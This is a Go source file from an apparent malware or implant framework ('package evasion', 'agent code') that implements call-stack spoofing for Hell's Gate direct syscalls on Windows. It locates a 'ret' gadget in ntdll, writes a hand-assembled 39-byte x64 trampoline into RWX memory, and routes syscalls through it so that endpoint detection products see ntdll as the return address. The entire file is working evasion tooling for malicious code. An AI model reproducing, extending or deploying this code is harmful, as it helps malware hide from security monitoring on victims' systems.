//go:build windows
// +build windows

package evasion

// Call-stack spoofing for Hell's Gate syscalls — Layer 1 evasion.
//
// EDR products walk the call-stack of a thread executing a syscall. If they
// see the return address pointing inside agent code they flag it. We instead
// arrange for the return address to point into ntdll itself (a `ret` gadget).
//
// How it works:
//
//  1. findNtdllRetGadget scans ntdll's first executable section for the first
//     `C3` (ret) byte. That address is our stack-walker decoy.
//
//  2. allocSpoofTrampoline writes a 39-byte RWX stub that:
//       a. Pushes the ntdll `ret` gadget as a fake return address.
//       b. Shuffles rcx/rdx/r8/r9 and loads [rsp+0x30..0x40] for up to
//          5 NT args (the syscall ABI on x64).
//       c. JMPs to the HG stub (not CALL — no new frame is pushed).
//     When the HG stub's final `syscall; ret` fires, it "returns" to the
//     ntdll gadget, which immediately returns again to the real Go caller.
//     A stack-walking EDR sees: <call site> → ntdll!<gadget> → kernel. ✓
//
//  3. SpoofedSyscall wraps syscall.SyscallN with this trampoline.
//     HGProc.Call is replaced to use it automatically.

import (
	"sync"
	"syscall"
	"unsafe"
)

// ────────────────────────────────────────────────────────────────────────────
// Package-level singletons — initialized exactly once

var (
	hgOnce       sync.Once
	hgGadget     uintptr // ntdll `ret` gadget address
	hgTrampoline uintptr // our 39-byte RWX trampoline
)

// initSpoofing initialises the gadget and trampoline on first use.
func initSpoofing() {
	hgOnce.Do(func() {
		hgGadget = findNtdllRetGadget()
		if hgGadget == 0 {
			return
		}
		hgTrampoline = allocSpoofTrampoline()
	})
}

// ────────────────────────────────────────────────────────────────────────────
// Gadget discovery

// findNtdllRetGadget finds the first `ret` (0xC3) byte in ntdll's first
// executable section.  Any `ret` in ntdll code works — the stack walker only
// inspects the return address, not whether it is mid-function.
func findNtdllRetGadget() uintptr {
	base := hgNtdllBase()
	if base == 0 {
		return 0
	}

	// Locate the first executable section via the PE section table.
	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	peBase := base + uintptr(e_lfanew)

	// FileHeader: 20 bytes after PE signature.
	// NumberOfSections is at offset +6; SizeOfOptionalHeader at offset +20.
	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))

	// Section table starts right after the optional header.
	sectionBase := peBase + 24 + uintptr(optHeaderSize)

	const (
		sectionHeaderSize   = 40
		sectionNameOffset   = 0
		sectionVSizeOffset  = 8
		sectionVAOffset     = 12
		sectionCharOffset   = 36
		imageScnMemExecute  = 0x20000000
		imageScnCntCode     = 0x00000020
	)

	for i := uint16(0); i < numSections; i++ {
		sh := sectionBase + uintptr(i)*sectionHeaderSize
		chars := *(*uint32)(unsafe.Pointer(sh + sectionCharOffset))
		if chars&imageScnMemExecute == 0 && chars&imageScnCntCode == 0 {
			continue
		}
		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
		if va == 0 || vsz == 0 {
			continue
		}
		start := base + uintptr(va)
		for off := uintptr(0); off < uintptr(vsz); off++ {
			if *(*byte)(unsafe.Pointer(start + off)) == 0xC3 {
				return start + off
			}
		}
	}
	return 0
}

// ────────────────────────────────────────────────────────────────────────────
// Trampoline

// trampolineBytes is the 39-byte x64 stub.
//
// It is called via syscall.SyscallN(hgTrampoline, gadget, hgStub, a0,a1,a2,a3,a4).
// On entry: rcx=gadget, rdx=hgStub, r8=a0, r9=a1, [rsp+0x28]=a2, [rsp+0x30]=a3, [rsp+0x38]=a4.
//
//	48 83 EC 08        sub  rsp, 8           ; make room — also 16-aligns the stack for the JMP target
//	48 89 0C 24        mov  [rsp], rcx       ; fake return address = ntdll gadget
//	48 89 D0           mov  rax, rdx         ; rax = hgStub address
//	4C 89 C1           mov  rcx, r8          ; rcx = a0
//	4C 89 CA           mov  rdx, r9          ; rdx = a1
//	4C 8B 44 24 30     mov  r8,  [rsp+0x30]  ; r8  = a2 (was [rsp+0x28], shifted by -8)
//	4C 8B 4C 24 38     mov  r9,  [rsp+0x38]  ; r9  = a3
//	4C 8B 54 24 40     mov  r10, [rsp+0x40]  ; r10 = a4 (temp)
//	4C 89 54 24 28     mov  [rsp+0x28], r10  ; 5th syscall arg slot
//	FF E0              jmp  rax              ; → hgStub: mov r10,rcx; mov eax,ssn; syscall; ret
//
// The hgStub's `ret` pops [rsp]=gadget → gadget's own `ret` pops SyscallN's
// return address, cleanly returning to the Go caller.
var trampolineBytes = [39]byte{
	0x48, 0x83, 0xEC, 0x08,                   // sub  rsp, 8
	0x48, 0x89, 0x0C, 0x24,                   // mov  [rsp], rcx
	0x48, 0x89, 0xD0,                          // mov  rax, rdx
	0x4C, 0x89, 0xC1,                          // mov  rcx, r8
	0x4C, 0x89, 0xCA,                          // mov  rdx, r9
	0x4C, 0x8B, 0x44, 0x24, 0x30,             // mov  r8,  [rsp+0x30]
	0x4C, 0x8B, 0x4C, 0x24, 0x38,             // mov  r9,  [rsp+0x38]
	0x4C, 0x8B, 0x54, 0x24, 0x40,             // mov  r10, [rsp+0x40]
	0x4C, 0x89, 0x54, 0x24, 0x28,             // mov  [rsp+0x28], r10
	0xFF, 0xE0,                                // jmp  rax
}

// allocSpoofTrampoline copies trampolineBytes into a private RWX allocation.
func allocSpoofTrampoline() uintptr {
	addr := hgAlloc(uint32(len(trampolineBytes)))
	if addr == 0 {
		return 0
	}
	dst := (*[len(trampolineBytes)]byte)(unsafe.Pointer(addr))
	*dst = trampolineBytes
	return addr
}

// ────────────────────────────────────────────────────────────────────────────
// Public API

// SpoofedSyscall calls the HG syscall stub with a spoofed return address so
// that EDR stack-walkers see ntdll at the top of the call chain.
//
// At most 5 NT arguments (a0–a4) are supported via the trampoline.
// If spoofing was not initialised (gadget or trampoline is 0) the call falls
// through to a direct syscall.SyscallN with no spoofing.
func SpoofedSyscall(stub uintptr, args ...uintptr) (r1, r2 uintptr, err syscall.Errno) {
	initSpoofing()

	var a [5]uintptr
	copy(a[:], args)

	if hgGadget == 0 || hgTrampoline == 0 || len(args) > 5 {
		// Fallback: direct call (no spoofing for >5-arg calls).
		return syscall.SyscallN(stub, a[0], a[1], a[2], a[3], a[4])
	}

	r1, r2, err = syscall.SyscallN(hgTrampoline, hgGadget, stub, a[0], a[1], a[2], a[3], a[4])
	return
}
